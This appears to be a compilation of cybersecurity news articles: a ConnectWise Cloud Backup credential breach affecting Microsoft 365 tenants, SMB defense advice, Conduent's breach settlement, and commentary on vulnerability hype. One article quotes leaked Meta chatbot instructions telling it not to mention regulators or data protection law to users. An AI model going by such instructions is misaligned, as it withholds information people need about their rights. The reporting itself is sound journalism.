While Alfozan is a US permanent resident who had been on the path to obtaining citizenship, his ties to his native Saudi Arabia have come under scrutiny. Prosecutors allege that Alfozan was “in frequent communications via WhatsApp” with a member of the Saudi royal family throughout 2025 and 2026.

ConnectWise Disables Cloud Backups Amid Concerns for Downstream MSPs

Researchers say attackers authenticated into Microsoft 365 tenants using ConnectWise credentials; ConnectWise says customer impact remains unconfirmed.

Alexander Culafi,Senior News Writer,Dark Reading

October 19, 2026

5 Min Read

Source: TU IS via Getty Images

A threat actor used credentials associated with ConnectWise's Cloud Backup product to authenticate into Microsoft 365 tenants, according to multiple security firms, though the extent of downstream compromise remains unclear.

First, on Oct. 16 and then throughout the weekend, ConnectWise shared details involving a possible supply chain incident and its product, ConnectWise Cloud Backup (formerly known as SkyKick). The software vendor, which primarily serves managed service providers (MSPs), said in its disclosure status post that it identified "unauthorized access to application identities associated with ConnectWise Cloud Backup" on Oct. 14, and that its investigation remains ongoing. In response to the incident, the company on Oct. 17 then disabled Cloud Backup for partners and clients, and over the weekend it also disabled SaaS Security and Cloud Management as the investigation and remediation efforts continue. Backups, restores, SaaS Security monitoring, and Cloud Management functions remain unavailable. ConnectWise said it also engaged an incident response firm. So far, the company hasn't confirmed any vulnerability exploitation as part of the attack chain.

Related:What We Missed: FBI Strikes Back at ShinyHunters

The caution is warranted: ConnectWise Cloud Backup is a software-as-a-service (SaaS) backup product for Microsoft 365 data, which therefore requires customer organizations to grant extensive permissions inside their 365 and Entra environments. The product generally is able to access Exchange mailboxes, OneDrive, SharePoint, Teams, and other sensitive workloads tied to the enterprise platform.

ConnectWise, Researchers Split on Blast Radius

Official details of the incident remain sparse. The original credential exposure mechanism remains under investigation, and ConnectWise has not attributed the breach to a specific attacker.

However, the company said it revoked certificates used by affected application connections and that the affected shared Cloud Backup credentials are no longer valid. It has also rotated credentials or disabled compromised identities identified as associated with the incident to date.

The status post includes indicators of compromise (IoCs) for customers; the company recommends customers review their own Microsoft 365 tenant and each managed customer tenant, including those with dormant SkyKick connections.

One unusual aspect of this incident is the discrepancy between the reporting of ConnectWise and third-party researchers, particularly regarding downstream impact. As of this writing, ConnectWise's disclosure post says downstream impact remains under investigation: "We have not identified confirmed downstream customer compromise."

Related:Carbonato Botnet Puts an AI Agent on Hacked Docker Hosts

The apparent disconnect may stem from how each party defines compromise. ConnectWise has repeatedly stated that it lacks independent visibility into customer Microsoft 365 environments and therefore cannot determine whether individual tenants experienced unauthorized activity.

"Our findings about stored archives are separate from potential activity in live Microsoft 365 environments," the blog post said. "Cloud Backup does not provide the downstream security visibility needed for us to determine independently whether a particular partner or customer tenant experienced unauthorized activity."

By contrast, security firms Huntress and Todyl argued in respective security blog posts that successful authentication into customer tenants using the ConnectWise application's credentials itself constitutes downstream impact, regardless of whether data access can be proven. Thus, ConnectWise does not explicitly disagree with either vendor's findings, but instead positions its messaging more cautiously.

Third-Party Researchers Assert Downstream Impact Occurred

On Oct. 16, Huntress's Jonathan Semon wrote in a blog post that a Microsoft 365 credential, specifically an API secret, belonging to ConnectWise Cloud Backup has been compromised. "Huntress has high confidence that the threat actor abused ConnectWise Cloud Management applications for Exchange Online, Microsoft Teams, and SharePoint Online, Cloud Backup, MS Graph, and Partner Center," Semon wrote.

Related:Microsoft Disrupts EvilTokens Device Code Phishing Service

Across two waves of activity, Semon said Huntress identified sign-in activity associated with more than 1,000 Entra tenants with sign-in activity from the IP address linked to the unauthorized activity (144.172.64[.]128), and "over 300 of those succeeded."

Semon tells Dark Reading that Huntress first saw broad sweeps across many organizations, followed by "a smaller, apparently more manual sweep of organizations in the policy, national security, trade, and critical mineral sectors, which was unsuccessful."

And in two tenants, Huntress saw a ConnectWise application give itself the highest level of access in a Microsoft 365 application (Global Administrator), then add credentials for other applications so the attacker would have a way back in that doesn't rely on the original ConnectWise key. "It's why we're recommending that organizations review credentials and administrator roles, and not only disable the affected apps," Semon says.

Huntress's core message is to assume the affected ConnectWise apps are unsafe until proven otherwise, and to look for persistence. Customers should confirm data retention and restore options with ConnectWise and manually check credentials for signs of compromise.

Broad Tenant Compromise Appears to Be a Real Concern

While Huntress said the credential works against every tenant where the app is consented and recommends disabling it (as mentioned, ConnectWise has disabled affected apps until further notice), Todyl explicitly tells customers to presume compromise. "We can assume ALL tenants that have 506e08f9-6e9a-4da4-942b-a099a03644ae [the Microsoft Entra application ID for the ConnectWise Cloud Backup application, formerly SkyKick Backup] enabled are compromised," Nicholas Koken wrote.

A spokesperson for Todyl tells Dark Reading that the most concerning aspect of this incident is that "the actor accessed SkyKick partner tenants in strict tenant-ID order, including tenants where the app had never been installed."

This, according to Todyl, is a very significant detail. "This indicates the actor held a pre-built list of SkyKick partner tenants, most likely sourced from vendor-side records," the spokesperson explains. "ConnectWise has not yet disclosed whether partner data, including tenant lists, was exposed."

Moreover, the spokesperson assesses that among the tenants Todyl monitors, the activity, which is targeted specifically at MSPs, appears to be reconnaissance and to check whether stolen credentials work.

In a statement shared this morning, ConnectWise reiterated, "Since implementing our mitigations, we have not observed successful threat activity in the environments we monitor."

"We have no indicators to date that Cloud Backup partner backup data has been compromised," ConnectWise says. "We have remediated identified compromised credentials and identities, and we continue authentication monitoring, permission review, and forensic analysis."

Regardless of whether or not it's true that all data with the application ID should be assumed compromised, the general advice between the two third-party security firms is similar: Make sure relevant applications are disabled, check indicators of compromise, and work with ConnectWise as needed.

Dark Reading contacted Microsoft for comment, but the company did not respond at press time.

Title: SMB protection from cyberattacks: weak spots and how to fix them
Context: When an employee opened the attachment, the malicious code inside it exploited a vulnerability in a local application, and the attackers took control of the device
Full Text:
The more a company’s infrastructure grows, the more weak spots it has. And that’s true for all companies — from large corporations with deep pockets that are able to invest more in their defenses, to small and medium-sized businesses. And despite their more modest capabilities, smaller companies are just as tempting a target for attackers.

New times, new risks

Cloud platforms, remote access, and AI help businesses scale up and get more done. But they also give attackers extra ways to get into corporate infrastructure. For example, remote employees’ personal devices have become a foothold that’s hard to control. And thanks to AI, phishing emails are almost impossible to tell from real ones: users can no longer spot a scammer by their spelling mistakes.

There’s another reason why new threats keep appearing: companies are slowly learning how to handle the old ones. Take backups. Just a few years ago they were sold as a cure-all against ransomware. Now they’re less effective, because at some point attackers started stealing data and demanding payment not for decryption, but for not making it public. What’s at stake here isn’t just business processes, but the organization’s reputation too. We wrote about this scheme in more detail in a separate blog post.

The scariest part is that an attacked company’s problems don’t end on the day of the incident. The next few days (or even weeks) are often much harder. This is when the team needs to quickly deal with the aftermath of an attack and to make sure another can’t happen again. Growing companies often have to throw their entire small IT force at the problem, so getting back to normal work can take a long time.

Three Achilles’ heels at once

According to the Global Kaspersky B2B Market Pulse survey, most SMBs only think about security when circumstances force them to; for example, after an incident, when expanding their infrastructure, or when a potential partner asks them to strengthen their perimeter before signing a contract. Yet only a handful treat continuous cybersecurity monitoring as a core part of running their business.

When a company finally decides to get serious about security, it runs into three constraints: people, processes, and technology. Let’s look at each one.

People. In a company with up to 500 employees, the IT department is usually just a few people. They handle all technical issues and have little to do with cybersecurity. When things get tough, these specialists may simply lack the expertise to deal with things. Other employees can be a weak link too. Accountants, lawyers, and other staff with access to confidential information often aren’t familiar with security rules.

Processes.A small IT department always has a backlog with a long queue of tasks; therefore, fresh updates and patches don’t get installed right away. As a result, attackers have plenty of time to take advantage of a vulnerability that isn’t fixed in time. Meanwhile, other employees may not know how to respond to suspicious emails, or how to store and share passwords safely. And there’s simply no one to keep an eye on them.

Technology. Threats evolve alongside a business’s technology. For example, once a company has moved part of its infrastructure to the cloud, relying on a classic antivirus alone becomes pointless.

So small and medium-sized businesses become easy targets for attackers not so much due to their size, but because they don’t pay enough attention to the key building blocks of cybersecurity. As to what this can lead to, and how the tables can be turned in a company’s favor — read on for a real-world case that demonstrates this.

Case study: ERP system breach

Let’s look at a real-world attack on a company with 450 employees. When the incident happened, the company was migrating its ERP system to the cloud. The data had already been moved, but the protection hadn’t been set up yet. And that limbo state is exactly what let the attackers pull off their campaign.

The attackers used a fairly simple tactic. Posing as an external ERP integrator, they sent the finance department a file with an “adjusted invoice”. When an employee opened the attachment, the malicious code inside it exploited a vulnerability in a local application, and the attackers took control of the device. There they found saved credentials that let them log in to a support account and get administrator rights on the cloud ERP server. With that account, they got into the server and stole the company’s confidential data.

We analyzed the mistakes that made this incident possible, and came back to the same formula: people + processes + technology. The company did provide employee training, but it was mostly a formality and did nothing to help people learn to spot email phishing. Security updates weren’t installed right away either, which is why the computer had an unpatched vulnerability. On top of that, privileged credentials were stored right on the employee’s device, which gave the attackers a direct path to administrator access. Finally, the workstations had no EDR, and the cloud ERP server had no workload protection.

How SMBs can strengthen their defenses

The best way to start is with the three key areas we covered above. And this isn’t about simply throwing money at security. What’s needed is a clear, step-by-step plan that makes the most of the resources the company already has.

Hands-on training

Employees are a business’s first line of defense, so it’s especially important to help them form safe cyberhabits. Many companies understand this and duly run computer literacy training; however, often employees show up in droves, yet they keep on making the same old mistakes.

The problem is that most training isn’t relevant to the people taking it. People in the finance department know that attackers can send phishing emails, but what does that have to do with their job? To head off questions like that, we recommend combining cybersecurity theory with simulations of real cyberattacks. That way, employees can safely step into the shoes of an attacker’s target. Start by training employees who have privileged access to systems, and also those who handle confidential information.

To keep training from becoming a formality, track progress regularly. For example, send employees suspicious test emails from time to time, and measure how fast and how well they react: how many recipients click the link, and how many report the threat.

Structured processes

Set up clear priorities for installing updates and patches. This helps avoid two extremes: running for months with open gaps in the infrastructure, or rushing to fix every vulnerability without asking how critical it is for specific business processes. Setting up centralized vulnerability management also helps, which we explained how to do in a separate post. Don’t rush to expand the infrastructure or move it to the cloud until the company has proper protection and monitoring in place.

Another key point: assign an owner to every process. Someone should be personally responsible for regular cybersecurity training, installing updates, and the timing and methods of incident response. That way, security tasks get done on time — even when the IT team has limited resources.

Gradual rollout of security solutions

It’s impossible to build reliable business protection without specialized products, but buying everything at once won’t help either. New solutions should match the needs of the infrastructure. A good approach is to add tools as the need to do so comes up; for example, to prioritize vulnerabilities more effectively or to strengthen the security of email or cloud environments. One way to tailor security to the company’s needs is to use our Security Modules , which work with Kaspersky Next Optimum — a solution for growing SMB and mid-market businesses.

Another option is to move to a more advanced solution as the infrastructure grows. The foundation of cybersecurity can be laid with Kaspersky Next EDR Foundations, which provides basic endpoint protection and control. Then, when needed, the company can move up to solutions with a broader range of capabilities, from Kaspersky Next EDR Optimum to Kaspersky Next XDR Optimum, or straight to Kaspersky Next MXDR Optimum. Our most comprehensive offering — Kaspersky MXDR Optimum — combines advanced detection and response that goes beyond endpoints and adapts to the needs of a growing business, 24/7 monitoring, and proactive threat hunting and investigation by Kaspersky experts.

Title: WhatsApp Help Pages Leaked Hidden Instructions for a Meta Chatbot
Context: ” And another tells the chatbot that it shouldn’t “mention specific upcoming community features that are not yet generally available
Full Text:
Dozens of WhatsApp web pages designed to answer people’s questions about Meta’s encrypted messaging app inadvertently exposed the company’s own instructions to its chatbot. These included some sections titled “WHAT NOT TO SAY” to users asking questions and explicit instructions not to provide people with legal advice.

A new analysis has found that around 80 help and FAQ pages across WhatsApp’s website exposed text instructions that were designed for a large language model, specifically one of Meta’s own. The instructions, according to findings from privacy company Redact, appeared in the webpages’ code and contained written details that were not explicitly on the WhatsApp help pages.

Among the 100 blocks of hidden text, the directions appeared to provide guidance to steer an LLM from answering users questions in unhelpful ways and provide a glimpse at how instructions for chatbots are created. In one instance, the WhatsApp page on how to delete your account included instructions that, alongside other advice, said, “Do not recommend contacting any Data Protection Authority, regulator, or supervisory authority” about the issue. WIRED viewed the exposed text, which can still be seen when viewing the underlying code of archived versions of the help pages.

“The stand-out thing here is the gap between what people are told vs LLMs,” says Dan Saltman, the CEO and founder of Redact.dev. He says the company regularly scans the sites and privacy policies of big tech firms, and that many of the WhatsApp instructions the team found were straightforward and point people towards other official support channels. Still, it does not appear the instructions were meant for public exposure.

After WIRED contacted Meta about the issue, the text was removed from across all the pages, with WhatsApp spokesperson Joshua Breckman saying it was being displayed due to a bug that has now been fixed. “These are instructions to our chatbot, not directly to users, and are intended to ensure accurate and relevant responses for WhatsApp users who choose to message WhatsApp Support with AI,” Breckman says. It is unclear if the text could be accessed by third-party chatbots or how long it had been displayed. “We train our support chatbots to be as helpful as possible,” Breckman says.

The exposed instructions appeared under code blocks with a heading: “HelpContentGalaxyLLMInclude.” They are no longer visible in the live pages’ code.

On the page “About reporting and blocking on WhatsApp,” the hidden instructions included a series of statements to follow if a “user mentions legal action, lawsuits, lawyers, attorneys, courts, or litigation.”

“Do not cite, quote, interpret, or reference WhatsApp Terms of Service, Privacy Policy, or any legal document,” the instructions said, adding not to make any statements about WhatsApp liability or non-liability. “Do not provide legal opinions, defenses, or interpretations on behalf of WhatsApp.”

“Do not reference, cite, or interpret data protection or privacy regulations (for example GDPR, LGPD, CCPA), including when a user raises them directly,” other parts of the instructions said.

Breckman, the WhatsApp spokesperson, says that the company provides users with transparent information about their data rights and how they can take actions. “We want our product support chatbots to be focused on providing the best advice to users about WhatsApp—not to offer legal advice,” Breckman says.

Other exposed instructions said what to respond with if a user says they are deaf or hard of hearing, including: “This statement is background about the user, NOT their support request.” And another tells the chatbot that it shouldn’t “mention specific upcoming community features that are not yet generally available.”

Title: Conduent Agrees to Pay $80m to Settle Data Breach Class Action
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Digital platform provider Conduent has agreed to pay $80m to settle a class action lawsuit following a 2024 cyber incident that breached the personal and health data of around 62 million people.

The money will be divided up into covering material losses experienced by individual claimants whose personal data was breached, the costs of credit monitoring and medical data monitoring services for each of the claimants and the plaintiff’s legal fees.

A filing submitted to the US District Court for the District of New Jersey on October 16, 2026 explained that the agreement divides the claimants into two subclasses.

One consists of around 40 million individuals whose stolen data was stored in complex backup files that were not readily accessible to third party actors. The second relates to 22 million individuals who stolen data was stored in files that were readily accessible.

Only those plaintiffs who have documented losses relating to fraud and/or identity theft stemming from the incident can claim a direct cash reimbursement, up to a maximum value of $3500.

If the settlement receives final approval from the Court, Conduent will no longer be liable for civil claims relating to the cyber incident.

The business services firm has also agreed to strengthen its data security practices as part of the settlement.

The settlement agreement was confirmed by Conduent in an 8-K filing form submitted to the US Securities and Exchange Commission (SEC) on October 16.

It emphasized that the agreement is not an admission of fault or liability, which Conduent denies.

“The Company maintains cyber insurance and does not expect this settlement to have a material impact on its financial position, results of operations or cash flows,” the filing added.

Conduent provides third-party printing/mailroom services, document processing services, payment integrity services and other back-office support services. The company supports approximately 100 million US residents across various government health programs, operates many of the largest toll systems in the US and is a provider of government payment disbursements for federally funded benefit and payment card programs.

Third Largest Healthcare Data Breach of All Time

The attack on Conduent was allegedly perpetrated by the SafePay ransomware gang, which claimed it had stolen 8.5TB of data from the firm.

The incident took place in October 2024 but was not discovered by Conduent for almost three months.

Following analysis of the impacted files, Conduent told affected individuals that an unauthorized actor exfiltrated data that may have included names, addresses, dates of birth, Social Security numbers, health insurance details and medical information.

The Health Insurance Portability and Accountability Act (HIPAA) journal ranks the incident as the third largest healthcare data beach of all time, as of October 2026, due the number of individuals’ protected health information that was compromised.

First place on that list remains the 2024 ransomware attack on the healthcare payment processing provider Change Healthcare, which has affected more than 192 million people.

This is followed by an incident which hit US health insurance giant Anthem in 2015, which HIPAA recorded as breaching the data of 78.8 million people.

Title: The Evolving Cybersecurity Lexicon: Vulnerability Discovery to Resilience
Context: Vulnerabilities & Threats Cybersecurity Operations Cyber Risk Commentary The Evolving Cybersecurity Lexicon: Vulnerability Discovery to Resilience An industry-wide, laser focus...
Full Text:
OPINION

Every year, the lexicographers at Merriam-Webster officially add new words or word usage to the dictionary. It's a fascinating process, outlined here. In 2009, a new usage of the word "tweet" was added to describe a social media post from the microblogging site then known as Twitter. "App" was added in 2010 to describe application software. And, in 2025, the word "slop" was amended to include AI slop, mass quantities of content created using generative AI. Watching our language and usage evolve gives us a glimpse into the zeitgeist.

When we reflect on 2026 and cybersecurity, what will the word of the year be? Without a doubt, the word of 2026 will be "vulnerability" or its plural "vulnerabilities." Think back to RSAC 2026, when the consensus post-conference was that the industry is suffering in a sea of sameness, and cybersecurity is a mature market that will be consolidated, commoditized, and monitored as a cost center.

Related:OnlyFans Copyright Takedowns Expose Compromised Websites

Then, on April 7, 2026, along came the public disclosure of Anthropic's Claude Mythos, and the word "vulnerability" was the topic of conversation for everyone from CEOs to pundits to security researchers. The industry launched into a full fear, uncertainty, and doubt (FUD) campaign, with the "vulnpocalypse" being declared. The conversation suddenly became about the sheer number of vulnerabilities that could be exposed and the attacks that could happen at scale. The industry is conflating vulnerability volume with risk, and that confusion is costing cybersecurity professionals credibility.

Fast forward six months and the world is still standing despite the record-setting number of vulnerabilities reported. In mid-September, CISA announced that over 67,000 Common Vulnerabilities and Exposures (CVEs) have been published; it anticipates 2026 will end with 96,000 new vulnerabilities.

Vulnerabilities Have Always Been With Us

The reality is that vulnerabilities have always existed in everything ever built by human beings. And vulnerabilities will continue to exist. Just because a vulnerability exists does not mean it's a risk. To pose a risk, vulnerabilities must be acted upon by a threat. The threat can be in the form of a cyberattack, a human error, or a natural disaster.

So, yes, agentic AI is absolutely allowing vulnerabilities to be discovered more quickly, but does the existence of a vulnerability mean it absolutely has to be remediated? No, not at all. Discovery is not exploitation, and exploitation is not impact. Imagine the credibility surge and reputational impact to the CISO when comments to the board change from "we have 15,000 open vulnerabilities" to "we reduced exposures on the three systems that drive 75% of our revenues." This is the type of language that shows leadership, alignment, and a focus on resilience and outcomes.

Related:Ivanti ICS Zero-Day Attacks Highlight Vendor Patching Hurdles

The fear being driven by the vulnpocalypse was ignited by the frontier AI companies, and cybersecurity companies followed the lead. It is now up to the cybersecurity community to move away from FUD and show leadership. The cybersecurity industry, including vendors, security teams, media, and analysts, needs to act in unison to protect the field — meaning, question the hype. We all must focus on ensuring cybersecurity to protect the business, the ideal we have spent decades building. AI increases the speed of vulnerability discovery. That is powerful. Prioritizing remediation based on business impact is the definitive goal.

The industry has weathered risks in the past and come through because of disciplined remediation strategies, communication, and setting expectations. Think of Y2K and the rigor behind timely and effective remediation. Y2K was not a hoax and was successful because of prioritization and business impact communication. As an industry, we must lead with credibility, communication, and clarity.

Related:Zero-Days Lurk in Microsoft's Overgrown October Patch Tuesday

Innovation Speeds Remediation of Vulnerabilities

In the spirit of protecting the field, we are seeing innovation from existing cybersecurity vendors to accelerate remediation of vulnerabilities, provide guidance on remediation, and assess business impact. New vendors are entering the market with funding mandates to build solutions for the AI era. Recent Omdia research shows 87% of organizations are seeking new tooling built for the AI era.

Security teams need to take this opportunity to position themselves as being in the business of outcomes, not cataloging and counting vulnerabilities. Change the conversation with the C-suite and board from the tactical concern about vulnerabilities to the real business discussion of managing risk and cyber resilience.

Building a cyber-resilient organization requires three elements. Security teams and the line of business need to be aligned. AI must be part of the defensive and offensive security strategies. And every stakeholder needs to coalesce and understand their role in the event of an unforeseen outage of the IT estate.

It is time for the cybersecurity industry to lead with conviction, deliver outcomes, and emphasize cyber resilience.

Vulnerability may be the word of 2026. Let's be strategic in our thinking and make resilience the word of 2027.
